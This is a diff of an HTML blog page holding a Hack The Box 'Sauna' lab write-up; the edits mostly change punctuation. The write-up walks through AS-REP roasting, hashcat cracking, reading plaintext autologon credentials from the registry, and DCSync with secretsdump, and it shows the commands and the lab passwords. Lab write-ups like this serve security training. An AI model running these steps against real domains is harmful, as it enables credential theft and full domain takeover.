@@ -51,7 +51,7 @@
     
 
     <link rel="canonical" href="http://localhost:1313/writeups/htb-sauna/">
-    <link href="/style.min.70057854b479eccebd00ce1d33560341c1c0af8cca6befd58da0b5471046514b.css" rel="stylesheet">
+    <link href="/style.min.2dc4fd9484cccdeb4e540eaff87cc3f2c37bacb70d134bbaec04ff76525358fc.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
     
@@ -196,13 +196,13 @@ stroke-linejoin="round" class="feather feather-home">
     <div class="mini-toc-content" id="miniTocContent"></div>
 </div>
             <div class="page-content">
-                <p>Windows AD box, no credentials given. The website is running for a fictional bank called Egotistical Bank, and it&rsquo;s the only initial foothold surface. What makes this box interesting is the AS-REP roasting step - it&rsquo;s a technique that often gets lumped in with Kerberoasting in tool menus, but the mechanism is completely different and worth understanding on its own. The escalation is clean: Winlogon autologon keys exposing a service account, that service account having DCSync rights.</p>
+                <p>Windows AD box, no credentials given. The website is running for a fictional bank called Egotistical Bank, and it&rsquo;s the only initial foothold surface. What makes this box interesting is the AS-REP roasting step, a technique that often gets lumped in with Kerberoasting in tool menus, but the mechanism is completely different and worth understanding on its own. The escalation is clean: Winlogon autologon keys exposing a service account, that service account having DCSync rights.</p>
 <h2 id="recon">Recon</h2>
 <p>10.129.95.180, domain <code>EGOTISTICAL-BANK.LOCAL</code>, DC hostname <code>SAUNA</code>. Web server on port 80 alongside the standard AD stack. Guest and null SMB sessions both failed. No obvious anonymous LDAP query access. The website was the starting point.</p>
 <h2 id="username-enumeration-from-the-website">Username Enumeration from the Website</h2>
 <p>The bank&rsquo;s site had a staff page listing employee names with their photos:</p>
 <p><img src="/images/writeups/htb-sauna/web-meet-the-team.png" alt="Egotistical Bank “Meet The Team” page showing six staff members: Fergus Smith, Shaun Coins, Hugo Bear, Bowie Taylor, Sophie Driver, and Steven Kerb"></p>
-<p>Six names. Real AD environments use all kinds of username conventions - first initial + last name, full name with dots, first name only. I generated every realistic variant for all six:</p>
+<p>Six names. Real AD environments use all kinds of username conventions, first initial + last name, full name with dots, first name only. I generated every realistic variant for all six:</p>
 <pre tabindex="0"><code>fsmith, fergus.smith, f.smith, fergussmith, smithf
 scoins, shaun.coins, s.coins, shaun
 hbear, hugo.bear, h.bear, hugo
@@ -211,9 +211,9 @@ sdriver, sophie.driver, s.driver, sophie
 skerb, steven.kerb, s.kerb, steven
 </code></pre><p>Thirty names total. Not every one will exist, but you only need one to hit.</p>
 <h2 id="as-rep-roasting">AS-REP Roasting</h2>
-<p>With a list of potential usernames, AS-REP roasting is worth trying before anything else. In normal Kerberos authentication, when a client requests a ticket (AS-REQ), it proves it knows the password by encrypting a timestamp with the user&rsquo;s key - this is Kerberos pre-authentication. The DC verifies the timestamp and only then issues the AS-REP.</p>
-<p>If an account has pre-authentication disabled, the DC skips that verification step and issues the AS-REP to anyone who asks - no password required. The AS-REP contains a session key encrypted with the user&rsquo;s NT hash. You can&rsquo;t log in with it directly, but you can take it offline and crack it the same way you&rsquo;d crack a Kerberoasting hash.</p>
-<p>Pre-auth disabled is usually an oversight - legacy applications sometimes required it, administrators enabled it and forgot to turn it back on.</p>
+<p>With a list of potential usernames, AS-REP roasting is worth trying before anything else. In normal Kerberos authentication, when a client requests a ticket (AS-REQ), it proves it knows the password by encrypting a timestamp with the user&rsquo;s key. This is Kerberos pre-authentication. The DC verifies the timestamp and only then issues the AS-REP.</p>
+<p>If an account has pre-authentication disabled, the DC skips that verification step and issues the AS-REP to anyone who asks, no password required. The AS-REP contains a session key encrypted with the user&rsquo;s NT hash. You can&rsquo;t log in with it directly, but you can take it offline and crack it the same way you&rsquo;d crack a Kerberoasting hash.</p>
+<p>Pre-auth disabled is usually an oversight. Legacy applications sometimes required it, administrators enabled it and forgot to turn it back on.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ <span class="se">\
 </span></span></span><span class="line"><span class="cl">  -usersfile users.txt <span class="se">\
 </span></span></span><span class="line"><span class="cl">  -dc-ip 10.129.95.180 <span class="se">\
@@ -221,7 +221,7 @@ skerb, steven.kerb, s.kerb, steven
 </span></span></span><span class="line"><span class="cl">  -outputfile asrep.hashes
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:4e3dd9817...
-</span></span></code></pre></div><p><code>fsmith</code> - Fergus Smith - had pre-authentication disabled. Everything else in the list came back with <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> (username not found) or a standard pre-auth required error.</p>
+</span></span></code></pre></div><p><code>fsmith</code>, Fergus Smith, had pre-authentication disabled. Everything else in the list came back with <code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code> (username not found) or a standard pre-auth required error.</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">hashcat -m <span class="m">18200</span> fsmith.hash /usr/share/wordlists/rockyou.txt
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nv">$krb5asrep$23$fsmith</span>@EGOTISTICAL-BANK.LOCAL:...:Thestrokes23
@@ -230,16 +230,16 @@ skerb, steven.kerb, s.kerb, steven
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> EGOTISTICAL-BANK.LOCAL<span class="se">\f</span>smith:Thestrokes23 <span class="o">(</span>Pwn3d!<span class="o">)</span>
 </span></span></code></pre></div><p>User flag on his desktop.</p>
 <h2 id="svc_loanmgr-from-the-winlogon-registry-key">svc_loanmgr from the Winlogon Registry Key</h2>
-<p>Inside fsmith&rsquo;s session, I checked the filesystem. <code>C:\Users\</code> showed a <code>svc_loanmgr</code> directory alongside Administrator and FSmith. That name showed up in BloodHound as having something interesting attached to it - I checked before digging through the filesystem:</p>
+<p>Inside fsmith&rsquo;s session, I checked the filesystem. <code>C:\Users\</code> showed a <code>svc_loanmgr</code> directory alongside Administrator and FSmith. That name showed up in BloodHound as having something interesting attached to it. I checked before digging through the filesystem:</p>
 <p><img src="/images/writeups/htb-sauna/bloodhound-svc-loanmgr-dcsync.png" alt="BloodHound graph showing SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL has DCSync, GetChangesAll, and GetChanges rights over the EGOTISTICAL-BANK.LOCAL domain"></p>
 <p>DCSync. <code>svc_loanmgr</code> can replicate all domain credentials. That&rsquo;s essentially a Domain Admin in terms of what damage you can do with it.</p>
-<p>The question was: how to get svc_loanmgr&rsquo;s password? Before running WinPEAS or anything noisy, I checked the Windows Autologon registry key. Autologon stores credentials in plaintext so Windows can log in automatically at boot without a user present - useful for kiosks, service machines, dedicated systems. The downside is those credentials sit in a readable registry location:</p>
+<p>The question was: how to get svc_loanmgr&rsquo;s password? Before running WinPEAS or anything noisy, I checked the Windows Autologon registry key. Autologon stores credentials in plaintext so Windows can log in automatically at boot without a user present, useful for kiosks, service machines, dedicated systems. The downside is those credentials sit in a readable registry location:</p>
 <pre tabindex="0"><code>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
 </code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">reg query <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&#34;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">DefaultUserName    REG_SZ    EGOTISTICALBANK<span class="se">\s</span>vc_loanmanager
 </span></span><span class="line"><span class="cl">DefaultPassword    REG_SZ    Moneymakestheworldgoround!
-</span></span></code></pre></div><p><code>svc_loanmanager:Moneymakestheworldgoround!</code>. Note the slight naming discrepancy - the registry key says <code>svc_loanmanager</code> (with an &lsquo;a&rsquo; at the end), but the AD account is <code>svc_loanmgr</code>. Same account, two different references.</p>
+</span></span></code></pre></div><p><code>svc_loanmanager:Moneymakestheworldgoround!</code>. Note the slight naming discrepancy. The registry key says <code>svc_loanmanager</code> (with an &lsquo;a&rsquo; at the end), but the AD account is <code>svc_loanmgr</code>. Same account, two different references.</p>
 <h2 id="dcsync">DCSync</h2>
 <p>With <code>svc_loanmgr</code> credentials and confirmed DCSync rights, secretsdump handles the rest. DCSync abuses the domain replication protocol: domain controllers are supposed to be able to request copies of AD objects from each other for replication purposes. The <code>GetChanges</code> and <code>GetChangesAll</code> rights let an account trigger that replication and request password hashes. secretsdump calls the DRSUAPI interface directly:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">secretsdump.py EGOTISTICAL-BANK.LOCAL/svc_loanmgr:<span class="s1">&#39;Moneymakestheworldgoround!&#39;</span>@10.129.95.180
@@ -372,6 +372,11 @@ skerb, steven.kerb, s.kerb, steven
 </svg>
 
 </a>
+
+
+    
+
+
 
 
     
